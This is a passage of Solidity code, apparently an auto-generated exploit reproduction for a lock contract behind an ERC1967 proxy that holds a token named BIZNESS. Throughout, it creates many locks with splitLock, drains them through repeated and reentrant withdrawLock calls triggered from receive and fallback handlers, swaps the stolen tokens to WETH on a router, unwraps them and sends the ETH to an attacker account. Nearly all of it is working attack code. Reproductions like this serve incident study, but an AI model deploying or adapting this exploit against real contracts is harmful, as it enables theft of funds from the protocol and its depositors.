        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(27)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(28)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(29)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(30)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(31)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(32)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(33)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(34)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(35)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(36)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(37)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(38)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(39)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(40)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(41)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(42)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(43)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(44)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(45)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(46)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(46);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockAmount_7 = 46;
        uint256 eRC1967ProxySplitLockReturn_29 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockAmount_7, 4412545597397598114138153, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(47)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(47);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_30 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_29, 4412545597397598114138152, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(48)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(48);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_31 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_30, 4412545597397598114138151, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(49)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(49);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_32 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_31, 4412545597397598114138150, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(50)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(50);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        {
            IERC1967Proxy(Addresses.ERC1967Proxy).splitLock{value: 11000000000000000}(
                eRC1967ProxySplitLockReturn_32, 4412545597397598114138149, 1735353747
            );
        }
    }

    function _attackRead9() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(12)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(14)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(15)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(16)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(17)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(18)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(19)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(20)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(21)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(22)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(23)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(24)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(25)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(26)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(27)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(28)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(29)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(30)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(31)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(32)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(33)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(34)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(35)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(36)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(37)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(38)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(39)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(40)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(41)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(42)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(43)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(44)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(45)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(46)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(47)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(48)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(49)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(50)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(51)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(51);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockAmount_8 = 51;
        uint256 eRC1967ProxySplitLockReturn_33 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockAmount_8, 4412545597397598114138148, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(52)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(52);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_34 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_33, 4412545597397598114138147, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(53)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(53);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_35 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_34, 4412545597397598114138146, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(54)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(54);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_36 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_35, 4412545597397598114138145, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(55)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(55);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        {
            IERC1967Proxy(Addresses.ERC1967Proxy).splitLock{value: 11000000000000000}(
                eRC1967ProxySplitLockReturn_36, 4412545597397598114138144, 1735353747
            );
        }
    }

    function _attackRead10() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(12)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(14)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(15)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(16)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(17)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(18)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(19)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(20)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(21)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(22)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(23)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(24)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(25)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(26)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(27)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(28)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(29)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(30)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(31)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(32)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(33)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(34)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(35)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(36)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(37)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(38)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(39)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(40)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(41)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(42)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(43)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(44)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(45)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(46)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(47)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(48)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(49)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(50)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(51)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(52)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(53)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(54)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(55)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(56)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(56);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockAmount_9 = 56;
        uint256 eRC1967ProxySplitLockReturn_37 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockAmount_9, 4412545597397598114138143, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(57)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(57);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_38 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_37, 4412545597397598114138142, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(58)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(58);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_39 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_38, 4412545597397598114138141, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(59)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(59);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        uint256 eRC1967ProxySplitLockReturn_40 = IERC1967Proxy(Addresses.ERC1967Proxy)
        .splitLock{value: 11000000000000000}(
            eRC1967ProxySplitLockReturn_39, 4412545597397598114138140, 1735353747
        );
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(60)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(60);
        IERC20Like(Addresses.BIZNESS).balanceOf(Addresses.ERC1967Proxy);
        {
            IERC1967Proxy(Addresses.ERC1967Proxy).splitLock{value: 11000000000000000}(
                eRC1967ProxySplitLockReturn_40, 4412545597397598114138139, 1735353747
            );
        }
    }

    function _attackRead11() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(12)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(14)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(15)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(16)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(17)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(18)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(19)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(20)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(21)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(22)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(23)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(24)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(25)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(26)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(27)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(28)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(29)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(30)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(31)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(32)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(33)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(34)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(35)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(36)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(37)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(38)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(39)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(40)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(41)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(42)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(43)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(44)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(45)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(46)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(47)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(48)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(49)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(50)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(51)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(52)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(53)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(54)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(55)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(56)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(57)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(58)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(59)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(60)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(61)));
        IERC1967Proxy(Addresses.ERC1967Proxy).locks(61);
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(0)));
        uint256 biznessBalanceOfAttackAttackContract = IERC20Like(Addresses.BIZNESS).balanceOf(address(this));
        {
            IERC20Like(Addresses.BIZNESS)
                .approve(Addresses.SwapRouter02, biznessBalanceOfAttackAttackContract);
        }
        {
            uint256 swapAmt = 220627279869879905706908225;
            uint256 swapRouter02ExactInputSingleReturn = ISwapRouter02(Addresses.SwapRouter02)
                .exactInputSingle(
                    Abi_exactInputSingle_Param0({
                        field0: Addresses.BIZNESS,
                        field1: Addresses.WETH,
                        field2: 3000,
                        field3: address(this),
                        field4: swapAmt,
                        field5: 0,
                        field6: 0
                    })
                );
        }
        uint256 wethBalanceOfAttackAttackContract = IERC20Like(Addresses.WETH).balanceOf(address(this));
        {
            IWETH(Addresses.WETH).withdraw(wethBalanceOfAttackAttackContract);
        }
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 5224470174770264654) nativeTransferAmount = 5224470174770264654;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
    }

    function _attack2() internal {
        _markCallback(1);
        _attack2Call();
        _attack2Call2();
        _attack2Call3();
        _attack2Call4();
        _attack2Call5();
        _attack2Call6();
    }

    function _attack2Call() internal {
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(11);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(12);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(13);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(14);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(15);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(16);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(17);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(18);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(19);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(20);
    }

    function _attack2Call2() internal {
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(21);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(22);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(23);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(24);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(25);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(26);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(27);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(28);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(29);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(30);
    }

    function _attack2Call3() internal {
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(31);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(32);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(33);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(34);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(35);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(36);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(37);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(38);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(39);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(40);
    }

    function _attack2Call4() internal {
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(41);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(42);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(43);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(44);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(45);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(46);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(47);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(48);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(49);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(50);
    }

    function _attack2Call5() internal {
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(51);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(52);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(53);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(54);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(55);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(56);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(57);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(58);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(59);
        IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(60);
    }

    function _attack2Call6() internal {}

    receive() external payable {
        if ((address(this) == address(this)
                    && (msg.sender == address(this) || msg.sender == Addresses.ERC1967Proxy))) _entryCb();
    }

    fallback() external payable {
        if (msg.sig == 0x735ac5b2) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {
        if (
            address(this) == address(this) && (msg.sender == address(this) || msg.sender == Addresses.ERC1967Proxy)
        ) _cb1Step();
        return;
    }

    function _cb1Step() internal {
        uint256 step = _nextEntryCb(1);
        if (step == 0) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(11);
            return;
        }
        if (step == 1) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(12);
            return;
        }
        if (step == 2) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(13);
            return;
        }
        if (step == 3) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(14);
            return;
        }
        if (step == 4) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(15);
            return;
        }
        if (step == 5) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(16);
            return;
        }
        if (step == 6) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(17);
            return;
        }
        if (step == 7) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(18);
            return;
        }
        if (step == 8) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(19);
            return;
        }
        if (step == 9) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(20);
            return;
        }
        if (step == 10) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(21);
            return;
        }
        if (step == 11) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(22);
            return;
        }
        if (step == 12) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(23);
            return;
        }
        if (step == 13) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(24);
            return;
        }
        if (step == 14) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(25);
            return;
        }
        if (step == 15) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(26);
            return;
        }
        if (step == 16) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(27);
            return;
        }
        if (step == 17) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(28);
            return;
        }
        if (step == 18) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(29);
            return;
        }
        if (step == 19) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(30);
            return;
        }
        if (step == 20) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(31);
            return;
        }
        if (step == 21) {
            IERC1967Proxy(Addresses.ERC1967Proxy).withdrawLock(32);
            return;
        }
        if (step == 22) {
